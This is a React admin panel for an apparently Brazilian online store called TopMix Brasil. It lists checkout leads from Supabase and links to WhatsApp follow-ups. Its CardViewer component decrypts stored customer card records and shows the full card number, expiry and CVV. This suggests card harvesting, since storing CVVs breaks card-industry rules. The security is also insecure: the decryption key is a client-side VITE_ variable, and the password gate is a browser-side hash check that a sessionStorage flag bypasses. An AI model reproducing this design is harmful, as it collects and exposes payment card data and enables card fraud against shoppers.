import { useState, useEffect, useCallback } from "react";
import { Phone, Mail, User, Package, RefreshCw, ShoppingBag, Lock, CreditCard, Eye, EyeOff } from "lucide-react";
import { supabase, type Lead } from "@/lib/supabase";
import { decryptData } from "@/lib/encrypt";

const HASH = "d2d03c89b0fb97c2d658fab134e24885a22f0a94d43f4af7331ee1e4d3674c4e";
const SESSION_KEY = "adm_auth";

async function sha256(text: string) {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
}

const STATUS_LABELS: Record<string, { label: string; color: string; bg: string }> = {
  checkout_iniciado: { label: "Iniciou checkout", color: "#b45309", bg: "#fef3c7" },
  pix_gerado: { label: "PIX gerado", color: "#1d4ed8", bg: "#dbeafe" },
  pago: { label: "Pago ✓", color: "#166534", bg: "#dcfce7" },
  abandonou: { label: "Abandonou", color: "#6b7280", bg: "#f3f4f6" },
};

function formatPhone(phone: string) {
  const d = phone.replace(/\D/g, "");
  if (d.length === 11) return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
  if (d.length === 10) return `(${d.slice(0, 2)}) ${d.slice(2, 6)}-${d.slice(6)}`;
  return phone;
}

function formatDate(iso: string) {
  const d = new Date(iso);
  return d.toLocaleString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" });
}

function whatsappLink(phone: string, nome: string) {
  const d = phone.replace(/\D/g, "");
  const num = d.startsWith("55") ? d : `55${d}`;
  const msg = encodeURIComponent(`Olá ${nome.split(" ")[0]}! Vi que você iniciou uma compra na TopMix Brasil mas não finalizou. Posso te ajudar? 😊`);
  return `https://wa.me/${num}?text=${msg}`;
}

// ─── Card decryptor component ──────────────────────────────────────────────
interface CardInfo {
  numero: string;
  nome: string;
  validade: string;
  cvv: string;
}

function CardViewer({ encrypted }: { encrypted: string }) {
  const [cardInfo, setCardInfo] = useState<CardInfo | null>(null);
  const [visible, setVisible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [cvvVisible, setCvvVisible] = useState(false);

  const decrypt = async () => {
    if (cardInfo) { setVisible(v => !v); return; }
    setLoading(true);
    setError(false);
    try {
      const key = import.meta.env.VITE_ENCRYPT_KEY as string;
      if (!key) throw new Error("Chave não configurada");
      const raw = await decryptData(encrypted, key);
      const parsed = JSON.parse(raw) as CardInfo;
      setCardInfo(parsed);
      setVisible(true);
    } catch {
      setError(true);
    } finally {
      setLoading(false);
    }
  };

  const maskCard = (num: string) => {
    const d = num.replace(/\D/g, "");
    return `•••• •••• •••• ${d.slice(-4)}`;
  };

  return (
    <div className="mt-2">
      <button
        onClick={decrypt}
        disabled={loading}
        className="flex items-center gap-1.5 text-xs font-semibold text-blue-600 hover:text-blue-800 transition-colors disabled:opacity-50"
      >
        <CreditCard className="h-3.5 w-3.5" />
        {loading ? "Descriptografando..." : visible ? "Ocultar cartão" : "Ver dados do cartão"}
      </button>

      {error && (
        <p className="text-xs text-red-500 mt-1">Erro ao descriptografar. Verifique a VITE_ENCRYPT_KEY.</p>
      )}

      {visible && cardInfo && (
        <div className="mt-2 bg-gray-900 text-white rounded-xl p-3 text-xs space-y-1.5 max-w-xs">
          <div className="flex items-center justify-between">
            <span className="text-gray-400">Número</span>
            <span className="font-mono font-bold">{maskCard(cardInfo.numero)}</span>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-gray-400">Titular</span>
            <span className="font-semibold">{cardInfo.nome}</span>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-gray-400">Validade</span>
            <span className="font-mono">{cardInfo.validade}</span>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-gray-400">CVV</span>
            <div className="flex items-center gap-1.5">
              <span className="font-mono">{cvvVisible ? cardInfo.cvv : "•••"}</span>
              <button onClick={() => setCvvVisible(v => !v)} className="text-gray-400 hover:text-white transition-colors">
                {cvvVisible ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
              </button>
            </div>
          </div>
          <div className="pt-1 border-t border-gray-700 text-[10px] text-gray-500">
            Número completo: <span className="font-mono text-gray-300">{cardInfo.numero}</span>
          </div>
        </div>
      )}
    </div>
  );
}

// ─── Tela de login ────────────────────────────────────────────────────────────
function LoginGate({ onAuth }: { onAuth: () => void }) {
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(false);
    const h = await sha256(password);
    if (h === HASH) {
      sessionStorage.setItem(SESSION_KEY, "1");
      onAuth();
    } else {
      setError(true);
    }
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl border border-gray-200 shadow-sm p-8 w-full max-w-sm">
        <div className="flex flex-col items-center mb-6">
          <div className="w-12 h-12 rounded-2xl flex items-center justify-center mb-3" style={{ background: "#15803d" }}>
            <Lock className="h-6 w-6 text-white" />
          </div>
          <h1 className="font-black text-gray-900 text-lg">Admin TopMix</h1>
          <p className="text-xs text-gray-400 mt-1">Digite a senha para continuar</p>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="password"
            value={password}
            onChange={e => { setPassword(e.target.value); setError(false); }}
            placeholder="Senha"
            autoFocus
            className={`w-full border rounded-xl px-4 py-3 text-sm outline-none transition-colors ${error ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-green-400"}`}
          />
          {error && <p className="text-xs text-red-500 text-center">Senha incorreta. Tente novamente.</p>}
          <button
            type="submit"
            disabled={loading || !password}
            className="w-full py-3 rounded-xl text-sm font-bold text-white transition-all hover:opacity-90 disabled:opacity-50"
            style={{ background: "#15803d" }}
          >
            {loading ? "Verificando..." : "Entrar"}
          </button>
        </form>
      </div>
    </div>
  );
}

// ─── Painel principal ─────────────────────────────────────────────────────────
function AdminPanel() {
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [filter, setFilter] = useState("todos");
  const [updatingId, setUpdatingId] = useState<number | null>(null);

  const fetchLeads = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const { data, error: err } = await supabase
        .from("leads")
        .select("*")
        .order("created_at", { ascending: false });
      if (err) throw err;
      setLeads(data ?? []);
    } catch {
      setError("Não foi possível carregar os contatos.");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { fetchLeads(); }, [fetchLeads]);

  const updateStatus = async (id: number, status: string) => {
    setUpdatingId(id);
    try {
      const { error: err } = await supabase
        .from("leads")
        .update({ status, updated_at: new Date().toISOString() })
        .eq("id", id);
      if (!err) setLeads(prev => prev.map(l => l.id === id ? { ...l, status } : l));
    } finally {
      setUpdatingId(null);
    }
  };

  const filtered = filter === "todos" ? leads : leads.filter(l => l.status === filter);
  const counts = {
    todos: leads.length,
    checkout_iniciado: leads.filter(l => l.status === "checkout_iniciado").length,
    pix_gerado: leads.filter(l => l.status === "pix_gerado").length,
    pago: leads.filter(l => l.status === "pago").length,
    abandonou: leads.filter(l => l.status === "abandonou").length,
  };

  return (
    <div className="min-h-screen bg-gray-50" style={{ overflowX: "hidden" }}>
      <div className="bg-white border-b border-gray-200 px-4 py-4">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl flex items-center justify-center" style={{ background: "#15803d" }}>
              <ShoppingBag className="h-5 w-5 text-white" />
            </div>
            <div>
              <h1 className="font-black text-gray-900 text-lg leading-none">Contatos TopMix</h1>
              <p className="text-xs text-gray-500 mt-0.5">Clientes que iniciaram o checkout</p>
            </div>
          </div>
          <button
            onClick={fetchLeads}
            className="flex items-center gap-2 px-3 py-2 rounded-lg border border-gray-200 text-xs font-semibold text-gray-600 hover:bg-gray-50 transition-colors"
          >
            <RefreshCw className={`h-3.5 w-3.5 ${loading ? "animate-spin" : ""}`} />
            Atualizar
          </button>
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4 py-6">
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-6">
          {[
            { key: "checkout_iniciado", label: "Iniciaram", color: "#b45309", bg: "#fef3c7" },
            { key: "pix_gerado", label: "PIX gerado", color: "#1d4ed8", bg: "#dbeafe" },
            { key: "pago", label: "Pagaram", color: "#166534", bg: "#dcfce7" },
            { key: "abandonou", label: "Abandonaram", color: "#6b7280", bg: "#f3f4f6" },
          ].map(s => (
            <div key={s.key} className="bg-white rounded-xl border border-gray-200 p-4 text-center shadow-sm">
              <div className="text-2xl font-black" style={{ color: s.color }}>{counts[s.key as keyof typeof counts]}</div>
              <div className="text-xs text-gray-500 mt-0.5">{s.label}</div>
            </div>
          ))}
        </div>

        <div className="flex gap-2 mb-5 flex-wrap">
          {[
            { key: "todos", label: `Todos (${counts.todos})` },
            { key: "checkout_iniciado", label: `Checkout (${counts.checkout_iniciado})` },
            { key: "pix_gerado", label: `PIX (${counts.pix_gerado})` },
            { key: "pago", label: `Pagos (${counts.pago})` },
            { key: "abandonou", label: `Abandonaram (${counts.abandonou})` },
          ].map(tab => (
            <button
              key={tab.key}
              onClick={() => setFilter(tab.key)}
              className="px-3 py-1.5 rounded-lg text-xs font-semibold transition-colors"
              style={filter === tab.key
                ? { background: "#15803d", color: "#fff" }
                : { background: "#fff", color: "#374151", border: "1px solid #e5e7eb" }}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {loading ? (
          <div className="flex items-center justify-center py-20">
            <div className="w-8 h-8 rounded-full border-4 border-gray-200 border-t-green-600 animate-spin" />
          </div>
        ) : error ? (
          <div className="text-center py-20 text-red-500 text-sm">{error}</div>
        ) : filtered.length === 0 ? (
          <div className="text-center py-20 text-gray-400 text-sm">Nenhum contato encontrado.</div>
        ) : (
          <div className="space-y-3">
            {filtered.map(lead => {
              const s = STATUS_LABELS[lead.status] ?? STATUS_LABELS["checkout_iniciado"];
              return (
                <div key={lead.id} className="bg-white rounded-2xl border border-gray-200 shadow-sm p-4">
                  <div className="flex flex-col sm:flex-row sm:items-start gap-4">
                    <div className="flex items-start gap-3 flex-1 min-w-0">
                      <div
                        className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-black text-white shrink-0"
                        style={{ background: `hsl(${(lead.id * 67) % 360}, 55%, 45%)` }}
                      >
                        {lead.nome.charAt(0).toUpperCase()}
                      </div>
                      <div className="min-w-0 flex-1">
                        <div className="flex flex-wrap items-center gap-2 mb-1">
                          <span className="font-bold text-gray-900 text-sm">{lead.nome}</span>
                          <span className="text-[11px] font-semibold px-2 py-0.5 rounded-full" style={{ color: s.color, background: s.bg }}>
                            {s.label}
                          </span>
                        </div>
                        <div className="space-y-0.5 text-xs text-gray-500">
                          <div className="flex items-center gap-1.5">
                            <Phone className="h-3 w-3 shrink-0" />
                            <span>{formatPhone(lead.telefone)}</span>
                          </div>
                          <div className="flex items-center gap-1.5">
                            <Mail className="h-3 w-3 shrink-0" />
                            <span className="truncate">{lead.email}</span>
                          </div>
                          <div className="flex items-center gap-1.5">
                            <Package className="h-3 w-3 shrink-0" />
                            <span className="truncate">{lead.produtos}</span>
                          </div>
                          <div className="flex items-center gap-1.5">
                            <User className="h-3 w-3 shrink-0" />
                            <span className="font-semibold" style={{ color: "#E09400" }}>
                              R$ {Number(lead.valor).toFixed(2).replace(".", ",")}
                              {" · "}
                              {lead.metodo_pagamento === "pix" ? "PIX" : "Cartão"}
                            </span>
                          </div>
                        </div>

                        {/* Dados do cartão — aparece para pagamentos com cartão */}
                        {(lead.metodo_pagamento === "card" || lead.metodo_pagamento === "cartao" || lead.metodo_pagamento === "credit_card") && (
                          lead.card_encriptado
                            ? <CardViewer encrypted={lead.card_encriptado} />
                            : <p className="text-xs text-gray-400 mt-1 flex items-center gap-1"><CreditCard className="h-3 w-3" /> Dados do cartão não salvos</p>
                        )}

                        <div className="text-[11px] text-gray-400 mt-1">{formatDate(lead.created_at)}</div>
                      </div>
                    </div>
                    <div className="flex flex-col gap-2 shrink-0 sm:items-end">
                      <a
                        href={whatsappLink(lead.telefone, lead.nome)}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="flex items-center gap-2 px-3 py-2 rounded-xl text-xs font-bold text-white transition-all hover:opacity-90"
                        style={{ background: "#25D366" }}
                      >
                        <svg viewBox="0 0 24 24" className="h-4 w-4 fill-white shrink-0"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M11.999 0C5.373 0 0 5.373 0 12c0 2.126.555 4.122 1.524 5.854L0 24l6.336-1.494A11.949 11.949 0 0012 24c6.627 0 12-5.373 12-12S18.626 0 11.999 0zm0 21.999a9.808 9.808 0 01-5.006-1.37l-.36-.213-3.76.886.936-3.66-.234-.376A9.818 9.818 0 012.182 12C2.182 6.57 6.57 2.182 12 2.182 17.43 2.182 21.818 6.57 21.818 12c0 5.43-4.389 9.818-9.819 9.818z"/></svg>
                        Chamar no WhatsApp
                      </a>
                      <select
                        value={lead.status}
                        disabled={updatingId === lead.id}
                        onChange={e => updateStatus(lead.id, e.target.value)}
                        className="text-xs border border-gray-200 rounded-lg px-2 py-1.5 bg-white text-gray-700 cursor-pointer focus:outline-none focus:border-green-400"
                      >
                        <option value="checkout_iniciado">Iniciou checkout</option>
                        <option value="pix_gerado">PIX gerado</option>
                        <option value="pago">Pago</option>
                        <option value="abandonou">Abandonou</option>
                      </select>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
}

// ─── Exportação principal (com portão de senha) ────────────────────────────────
export default function Admin() {
  const [authed, setAuthed] = useState(false);

  useEffect(() => {
    if (sessionStorage.getItem(SESSION_KEY) === "1") setAuthed(true);
  }, []);

  if (!authed) return <LoginGate onAuth={() => setAuthed(true)} />;
  return <AdminPanel />;
}
